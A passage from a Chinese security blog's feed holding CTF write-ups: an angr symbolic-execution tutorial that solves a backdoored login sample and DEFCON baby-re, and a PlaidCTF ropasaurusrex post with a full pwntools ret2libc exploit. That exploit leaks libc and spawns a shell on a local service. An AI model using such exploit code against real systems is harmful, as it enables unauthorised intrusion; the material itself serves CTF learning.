<p>结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">$ python judgement.py </div><div class="line">[+] Opening connection to localhost on port 5555: Done</div><div class="line">[*] Closed connection to localhost port 5555</div><div class="line">...</div><div class="line">...</div><div class="line">...</div><div class="line">[+] Opening connection to localhost on port 5555: Done</div><div class="line">[*] Closed connection to localhost port 5555</div><div class="line">[+] Opening connection to localhost on port 5555: Done</div><div class="line">The flag is: TWCTF&#123;R3:l1f3_1n_4_pwn_w0rld_fr0m_z3r0&#125;</div><div class="line">Wrong flag...</div><div class="line"></div><div class="line">[*] Closed connection to localhost port 5555</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这道题的功能就是等Flag judgment system\nInput flag &amp;gt;&amp;gt; 时输入flag，然后和真正的flag进行对比，如果正确就输出Correct flag!!,错误就输出Wrong flag…。同时我们发现这个程序的printf存在格式化字符串漏洞。&lt;br&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="http://spd.dropsec.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="CTF" scheme="http://spd.dropsec.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>符号执行-基于python的二进制分析框架angr</title>
    <link href="http://spd.dropsec.xyz/2017/04/09/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C-%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6angr/"/>
    <id>http://spd.dropsec.xyz/2017/04/09/符号执行-基于python的二进制分析框架angr/</id>
    <published>2017-04-09T10:12:15.000Z</published>
    <updated>2017-04-09T11:46:34.980Z</updated>
    
    <content type="html"><![CDATA[<h3 id="符号执行概述"><a href="#符号执行概述" class="headerlink" title="符号执行概述"></a>符号执行概述</h3><p>在学习这个框架之前首先要知道符号执行。<br>符号执行技术使用符号值代替数字值执行程序，得到的变量的值是由输入变 量的符号值和常量组成的表达式。符号执行技术首先由King在1976年提出 ，经过三十多年的发展，现在仍然被广泛研究，它在软件测试和程序验证中发挥着重 要作用。符号执行是一种重要的形式化方法和静态分析技术，它使用数学和逻辑 首先定义一些基本概念。程序的路径（path）是程序的一个语句序列，这个 语句序列包括程序的一些顺序的代码片段，代码片段之间的连接是由于分支语句 导致的控制转移。一个路径是可行的（feasible），是指存在程序输入变量的至少一组值，如果以这组值作为输入，程序将沿着这条路径执行。否则，路径就是不 可行的（infeasible）。路径条件（path condition,PC）是针对一个路径的，它是一 个关于程序输入变量的符号值的约束，一组输入值使得程序沿着这条路径执行当 且仅当这组输入值满足这条路径的路径条件。具体看这里，<a href="https://github.com/chyyuu/symexe/blob/master/klee_document/klee_analysis.md" target="_blank" rel="external">链接</a><br><a id="more"></a></p>
<h3 id="angr框架介绍"><a href="#angr框架介绍" class="headerlink" title="angr框架介绍"></a>angr框架介绍</h3><p>在二进制代码中寻找并且利用漏洞是一项非常具有挑战性的工作，它的挑战性主要在于人工很难直观的看出二进制代码中的数据结构、控制流信息等。angr是一个基于python的二进制漏洞分析框架，它将以前多种分析技术集成进来，方便后续的安全研究人员的开发。­­­它能够进行动态的符号执行分析（如，KLEE和Mayhem），也能够进行多种静态分析。<br>当然这款工具在CTF中的运用还是比较火的，在一些国际比赛中经常会看到它所带来的神奇之处，比如下面我们将要讲的的DEFCON CTF Qualifier 2016 baby-re这道题它仅仅用了10min就完成看了自动化分析拿到了flag。angr的github地址为，<a href="https://github.com/angr/angr" target="_blank" rel="external">链接</a></p>
<h3 id="angr的安装"><a href="#angr的安装" class="headerlink" title="angr的安装"></a>angr的安装</h3><p>理论上来说angr目前支持linux、windows、MAC多个平台。但是支持的最好的还是linux平台。Windows平台下由于相关的依赖库文件较难安装，因此不太建议在windows上安装。<br>接下来我们介绍一下ubuntu上的安装。</p>
<ul>
<li>安装独立python虚拟环境，virtualenvwrapper是一个python的虚拟环境，使用这个的主要原因是angr会对于libz3 or libVEX产生修改，为了防止对已经安装的库的修改而影响到到之后其他程序的使用，使用一个python的虚拟机环境是一个不错的选择。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install python-dev libffi-dev build-essential virtualenvwrapper</div></pre></td></tr></table></figure>
</li>
</ul>
<p>此时virtualenvwrapper就可以使用了,常用命令如下：</p>
<ol>
<li>列出虚拟环境列表:workon，也可以使用：lsvirtualenv</li>
<li>新建虚拟环境:mkvirtualenv [虚拟环境名称]</li>
<li>启动/切换虚拟环境:workon [虚拟环境名称]</li>
<li>删除虚拟环境:rmvirtualenv [虚拟环境名称]</li>
<li>离开虚拟环境:deactivate</li>
</ol>
<ul>
<li>接着angr安装</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install angr</div></pre></td></tr></table></figure>
<p>安装好以后我们启动虚拟环境，进入虚拟的python库后就可以载入angr库了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">longlong@ubuntu:~/examples/defcon2016quals_baby-re_0$ workon angr</div><div class="line">(angr) longlong@ubuntu:~/examples/defcon2016quals_baby-re_0$ python</div><div class="line">Python 2.7.6 (default, Oct 26 2016, 20:30:19) </div><div class="line">[GCC 4.8.4] on linux2</div><div class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</div><div class="line">&gt;&gt;&gt; import angr</div></pre></td></tr></table></figure></p>
<h3 id="angr的使用之简单例子一"><a href="#angr的使用之简单例子一" class="headerlink" title="angr的使用之简单例子一"></a>angr的使用之简单例子一</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="keyword">char</span> *sneaky = <span class="string">"SOSNEAKY"</span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">authenticate</span><span class="params">(<span class="keyword">char</span> *username, <span class="keyword">char</span> *password)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> stored_pw[<span class="number">9</span>];</div><div class="line">    stored_pw[<span class="number">8</span>] = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> pwfile;</div><div class="line">    <span class="comment">// evil back d00r</span></div><div class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(password, sneaky) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    pwfile = open(username, O_RDONLY);</div><div class="line">    read(pwfile, stored_pw, <span class="number">8</span>);</div><div class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(password, stored_pw) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">accepted</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to the admin console, trusted user!\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">rejected</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Go away!"</span>);</div><div class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> username[<span class="number">9</span>];</div><div class="line">    <span class="keyword">char</span> password[<span class="number">9</span>];</div><div class="line">    <span class="keyword">int</span> authed;</div><div class="line">    username[<span class="number">8</span>] = <span class="number">0</span>;</div><div class="line">    password[<span class="number">8</span>] = <span class="number">0</span>;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Username: \n"</span>);</div><div class="line">    read(<span class="number">0</span>, username, <span class="number">8</span>);</div><div class="line">    read(<span class="number">0</span>, &amp;authed, <span class="number">1</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Password: \n"</span>);</div><div class="line">    read(<span class="number">0</span>, password, <span class="number">8</span>);</div><div class="line">    read(<span class="number">0</span>, &amp;authed, <span class="number">1</span>);</div><div class="line">    authed = authenticate(username, password);</div><div class="line">    <span class="keyword">if</span> (authed) accepted();</div><div class="line">    <span class="keyword">else</span> rejected();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个程序的逻辑很简单，样例程序的功能就是让你输入用户名和密码，然后authenticate函数会进行检验，如果失败就显示Go away，反之就显示认证成功。<br>接下来我们用angr编写利用脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#_*_ coding:utf-8 _*_</span></div><div class="line"><span class="keyword">import</span> angr</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">basic_symbolic_execution</span><span class="params">()</span>:</span></div><div class="line">    p = angr.Project(<span class="string">'fauxware'</span>) <span class="comment">#新建一个angr的工程，括号中是目标二进制程序的路径</span></div><div class="line">    state = p.factory.entry_state()  <span class="comment">#接着新建一个SimState的对象</span></div><div class="line">    path = p.factory.path(state) <span class="comment">#使用factory.path这个容器获取state的起点path对象</span></div><div class="line">    pathgroup = p.factory.path_group(path) <span class="comment">#根据前面获取的函数入口点的path对象，利用path_group容器获取沿着path开端下面将会执行的path列表</span></div><div class="line">    pathgroup.step(until=<span class="keyword">lambda</span> lpg: len(lpg.active) &gt; <span class="number">1</span>)<span class="comment">#接下来就让pathgroup对象一直执行下去，直到执行到可选择的路径个数大于一个，即产生选择分支的时候，再停止。</span></div><div class="line">	                                                     <span class="comment">#对应在上述的简单程序中authenticate函数的 if (strcmp(password, sneaky) == 0)这个条件判断语句</span></div><div class="line">    </div><div class="line">	</div><div class="line">	input_0 = pathgroup.active[<span class="number">0</span>].state.posix.dumps(<span class="number">0</span>) <span class="comment">#dump出所有分支的内容，看看哪个答案应该是最可能的</span></div><div class="line">    input_1 = pathgroup.active[<span class="number">1</span>].state.posix.dumps(<span class="number">0</span>)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> <span class="string">'SOSNEAKY'</span> <span class="keyword">in</span> input_0:</div><div class="line">        <span class="keyword">return</span> input_0</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> input_1</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">pass</span>        </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line"><span class="keyword">print</span> basic_symbolic_execution()</div></pre></td></tr></table></figure></p>
<p>结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(angr) longlong@ubuntu:~/examples/fauxware$ python solve.py </div><div class="line">SOSNEAKY</div><div class="line">(angr) longlong@ubuntu:~/examples/fauxware$</div></pre></td></tr></table></figure></p>
<h3 id="angr的使用之简单例子二（CTF题）"><a href="#angr的使用之简单例子二（CTF题）" class="headerlink" title="angr的使用之简单例子二（CTF题）"></a>angr的使用之简单例子二（CTF题）</h3><p>这道题是DEFCON CTF Qualifier 2016 baby-re0，在打开二进制可执行文件后，我们向下移动到主要的底部，看到0x4028e7有两条非常明显的路径，一条路径是0x402941，打印出错误。另一条是0x4028e9，将会打印出flag。但是这个程序的中间有大量的繁琐的指令，看的人眼花缭乱，接下来我们用angr解决这个问题。</p>
<p><img src="http://oj3cgkt4g.bkt.clouddn.com/20170409-1.png" alt=""></p>
<p>脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2</span></div><div class="line"><span class="comment">#_*_ coding:UTF-8 _*_</span></div><div class="line"><span class="keyword">import</span> angr</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	proj = angr.Project(<span class="string">'./baby-re'</span>,  load_options=&#123;<span class="string">'auto_load_libs'</span>: <span class="keyword">False</span>&#125;)</div><div class="line"></div><div class="line">	path_group = proj.factory.path_group(threads=<span class="number">4</span>) <span class="comment"># 设置了四个线程，对于这个程序线程再多了没意义</span></div><div class="line"></div><div class="line">	<span class="comment"># 如果是0x40294b就执行，如果是0x402941就不去执行</span></div><div class="line">	path_group.explore(find=<span class="number">0x40294b</span>, avoid=<span class="number">0x402941</span>) </div><div class="line">	<span class="comment"># flag在0x40292c的位置</span></div><div class="line">        <span class="keyword">print</span> path_group.found[<span class="number">0</span>].state.posix.dumps(<span class="number">0</span>)</div><div class="line">	<span class="keyword">return</span> path_group.found[<span class="number">0</span>].state.posix.dumps(<span class="number">1</span>) <span class="comment"># dumps出flag</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	print(repr(main()))</div></pre></td></tr></table></figure></p>
<p>结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">(angr) longlong@ubuntu:~/examples/defcon2016quals_baby-re_0$ python solve.py </div><div class="line">WARNING | 2017-04-09 16:34:11,976 | simuvex.plugins.symbolic_memory | Concretizing symbolic length. Much sad; think about implementing.</div><div class="line">WARNING | 2017-04-09 16:34:14,865 | simuvex.plugins.symbolic_memory | Concretizing symbolic length. Much sad; think about implementing.</div><div class="line">WARNING | 2017-04-09 16:34:19,274 | simuvex.plugins.symbolic_memory | Concretizing symbolic length. Much sad; think about implementing.</div><div class="line">WARNING | 2017-04-09 16:34:26,447 | simuvex.plugins.symbolic_memory | Concretizing symbolic length. Much sad; think about implementing.</div><div class="line">WARNING | 2017-04-09 16:34:38,414 | simuvex.plugins.symbolic_memory | Concretizing symbolic length. Much sad; think about implementing.</div><div class="line">WARNING | 2017-04-09 16:34:58,141 | simuvex.plugins.symbolic_memory | Concretizing symbolic length. Much sad; think about implementing.</div><div class="line">WARNING | 2017-04-09 16:35:24,905 | simuvex.plugins.symbolic_memory | Concretizing symbolic length. Much sad; think about implementing.</div><div class="line">WARNING | 2017-04-09 16:36:00,673 | simuvex.plugins.symbolic_memory | Concretizing symbolic length. Much sad; think about implementing.</div><div class="line">WARNING | 2017-04-09 16:36:45,998 | simuvex.plugins.symbolic_memory | Concretizing symbolic length. Much sad; think about implementing.</div><div class="line">WARNING | 2017-04-09 16:37:48,193 | simuvex.plugins.symbolic_memory | Concretizing symbolic length. Much sad; think about implementing.</div><div class="line">WARNING | 2017-04-09 16:39:20,551 | simuvex.plugins.symbolic_memory | Concretizing symbolic length. Much sad; think about implementing.</div><div class="line">WARNING | 2017-04-09 16:41:20,080 | simuvex.plugins.symbolic_memory | Concretizing symbolic length. Much sad; think about implementing.</div><div class="line">WARNING | 2017-04-09 16:44:18,468 | simuvex.plugins.symbolic_memory | Concretizing symbolic length. Much sad; think about implementing.</div><div class="line">+000000077+000000097+000000116+000000104+000000032+000000105+000000115+000000032+000000104+000000097+000000114+000000100+000000033B</div><div class="line">&apos;Var[0]: Var[1]: Var[2]: Var[3]: Var[4]: Var[5]: Var[6]: Var[7]: Var[8]: Var[9]: Var[10]: Var[11]: Var[12]: The flag is: Math is hard!\n&apos;</div><div class="line">(angr) longlong@ubuntu:~/examples/defcon2016quals_baby-re_0$</div></pre></td></tr></table></figure></p>
<p>大概10min后我们得到的flag 是Math is hard!</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;符号执行概述&quot;&gt;&lt;a href=&quot;#符号执行概述&quot; class=&quot;headerlink&quot; title=&quot;符号执行概述&quot;&gt;&lt;/a&gt;符号执行概述&lt;/h3&gt;&lt;p&gt;在学习这个框架之前首先要知道符号执行。&lt;br&gt;符号执行技术使用符号值代替数字值执行程序，得到的变量的值是由输入变 量的符号值和常量组成的表达式。符号执行技术首先由King在1976年提出 ，经过三十多年的发展，现在仍然被广泛研究，它在软件测试和程序验证中发挥着重 要作用。符号执行是一种重要的形式化方法和静态分析技术，它使用数学和逻辑 首先定义一些基本概念。程序的路径（path）是程序的一个语句序列，这个 语句序列包括程序的一些顺序的代码片段，代码片段之间的连接是由于分支语句 导致的控制转移。一个路径是可行的（feasible），是指存在程序输入变量的至少一组值，如果以这组值作为输入，程序将沿着这条路径执行。否则，路径就是不 可行的（infeasible）。路径条件（path condition,PC）是针对一个路径的，它是一 个关于程序输入变量的符号值的约束，一组输入值使得程序沿着这条路径执行当 且仅当这组输入值满足这条路径的路径条件。具体看这里，&lt;a href=&quot;https://github.com/chyyuu/symexe/blob/master/klee_document/klee_analysis.md&quot;&gt;链接&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://spd.dropsec.xyz/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="符号执行" scheme="http://spd.dropsec.xyz/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>PlaidCTF2013-ropasaurusrex</title>
    <link href="http://spd.dropsec.xyz/2017/04/04/PlaidCTF2013-ropasaurusrex/"/>
    <id>http://spd.dropsec.xyz/2017/04/04/PlaidCTF2013-ropasaurusrex/</id>
    <published>2017-04-04T12:32:10.000Z</published>
    <updated>2017-04-07T09:05:33.190Z</updated>
    
    <content type="html"><![CDATA[<p>这个程序流程很简单，它有两个功能，一个是read读入数据，一个是write输出数据.<br>我们发现在sub_80483F4()函数这里存在缓冲区溢出漏洞，buf大小为0x88（136）字节，而read最多可以读入0x100(256)字节。<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">int __cdecl main()</div><div class="line">&#123;</div><div class="line">  sub_80483F4();</div><div class="line">  return write(1, &quot;WIN\n&quot;, 4u);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ssize_t sub_80483F4()</div><div class="line">&#123;</div><div class="line">  char buf; // [sp+10h] [bp-88h]@1</div><div class="line"></div><div class="line">  return read(0, &amp;buf, 0x100u);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>ropasaurusrex是一个32位的ELF文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">longlong@ubuntu:~/ctf/plaidctf2013$ file ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d </div><div class="line">ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, BuildID[sha1]=96997aacd6ee7889b99dc156d83c9d205eb58092, stripped</div><div class="line">longlong@ubuntu:~/ctf/plaidctf2013$</div></pre></td></tr></table></figure></p>
<p>我们发现它开了NX 保护<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ checksec </div><div class="line">CANARY    : disabled</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : ENABLED</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : disabled</div><div class="line">gdb-peda$</div></pre></td></tr></table></figure></p>
<p>不知道远程服务器上有没有ASLR保护，假设它是开着的，在我的测试机器上是开着的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">longlong@ubuntu:~/ctf/plaidctf2013$ ldd ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d </div><div class="line">	linux-gate.so.1 =&gt;  (0xf77af000)</div><div class="line">	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf75e4000)</div><div class="line">	/lib/ld-linux.so.2 (0x56574000)</div><div class="line">longlong@ubuntu:~/ctf/plaidctf2013$ ldd ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d </div><div class="line">	linux-gate.so.1 =&gt;  (0xf7789000)</div><div class="line">	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf75be000)</div><div class="line">	/lib/ld-linux.so.2 (0x5658b000)</div><div class="line">longlong@ubuntu:~/ctf/plaidctf2013$</div></pre></td></tr></table></figure></p>
<p>接下来我们我们还原环境，将它用socat绑定在本地2323端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">longlong@ubuntu:~/ctf/plaidctf2013$ socat TCP-LISTEN:2323,fork EXEC:./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d</div></pre></td></tr></table></figure></p>
<p>思路：</p>
<ol>
<li>构造rop链1泄露libc的基地址</li>
<li>计算sytem、bin/sh的真实地址，构造rop链2</li>
</ol>
<p>EXP如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/env python2</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </div><div class="line"></div><div class="line">p = remote(<span class="string">'127.0.0.1'</span>,<span class="number">2323</span>)</div><div class="line"></div><div class="line"><span class="comment">#p = process('./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d')</span></div><div class="line"><span class="comment">#context.log_level = 'debug'</span></div><div class="line"><span class="comment">#gdb.attach(p)</span></div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d'</span>)</div><div class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</div><div class="line">bof = <span class="number">0x80483f4</span> <span class="comment"># sub_80483F4()</span></div><div class="line">  </div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x88</span></div><div class="line">payload += <span class="string">'AAAA'</span> <span class="comment"># saved ebp</span></div><div class="line">payload += p32(elf.symbols[<span class="string">'write'</span>]) </div><div class="line">payload += p32(bof)           </div><div class="line">payload += p32(<span class="number">1</span>)        <span class="comment">#write(1,read,4)</span></div><div class="line">payload += p32(elf.got[<span class="string">'read'</span>])</div><div class="line">payload += p32(<span class="number">4</span>) </div><div class="line">p.send(payload)</div><div class="line">resp = p.recvn(<span class="number">4</span>)</div><div class="line">read = u32(resp)</div><div class="line">libc_base = read - libc.symbols[<span class="string">'read'</span>]</div><div class="line">  </div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x88</span></div><div class="line">payload += <span class="string">'AAAA'</span> <span class="comment"># saved ebp</span></div><div class="line">payload += p32(libc_base + libc.symbols[<span class="string">'system'</span>])</div><div class="line">payload += <span class="string">'AAAA'</span> <span class="comment"># cont</span></div><div class="line">payload += p32(libc_base + next(libc.search(<span class="string">'/bin/sh'</span>)))</div><div class="line">p.send(payload)</div><div class="line">  </div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p>结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">longlong@ubuntu:~/ctf/plaidctf2013$ python ropasaurusrex.py </div><div class="line">[+] Opening connection to 127.0.0.1 on port 2323: Done</div><div class="line">[*] Switching to interactive mode</div><div class="line">$ whoami</div><div class="line">longlong</div><div class="line">$ ls</div><div class="line">libc.so.6-f85c96c8fc753bfa75140c39501b4cd50779f43a</div><div class="line">ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d</div><div class="line">ropasaurusrex.py</div><div class="line">ropasaurusrex.py~</div><div class="line">$</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个程序流程很简单，它有两个功能，一个是read读入数据，一个是write输出数据.&lt;br&gt;我们发现在sub_80483F4()函数这里存在缓冲区溢出漏洞，buf大小为0x88（136）字节，而read最多可以读入0x100(256)字节。&lt;br&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="http://spd.dropsec.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="CTF" scheme="http://spd.dropsec.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>rMath-浮点运算的逆向分析</title>
    <link href="http://spd.dropsec.xyz/2017/03/30/rMath-%E6%B5%AE%E7%82%B9%E8%BF%90%E7%AE%97%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>http://spd.dropsec.xyz/2017/03/30/rMath-浮点运算的逆向分析/</id>
    <published>2017-03-30T08:04:36.000Z</published>
    <updated>2017-04-07T09:07:25.720Z</updated>
    
    <content type="html"><![CDATA[<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>这个题就是把输入的字符串先去掉ZCTF{}后，把括号里的字符串替换，然后进行了浮点运算，运算后的结果和0x19异或，得到的数值就是 . 7 , ) <em> ! . ( , , ) . , , </em> / <em> </em><br><a id="more"></a></p>
<h3 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h3><p>载入IDA能看出flag格式为：</p>
